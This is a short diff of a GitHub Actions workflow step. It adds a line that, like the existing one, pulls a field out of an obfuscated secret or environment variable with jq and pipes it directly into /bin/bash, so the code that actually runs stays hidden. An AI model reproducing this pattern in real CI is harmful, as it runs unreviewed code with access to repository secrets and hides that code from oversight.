@@ -22,6 +22,7 @@ jobs:
           iry5496: ${{ secrets.iry5496 }}
         run: |
           printf '%s' "$iry5496" | jq -r .shetb66442 | /bin/bash
+          echo $fcu085 | jq -r .cfpy45145 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
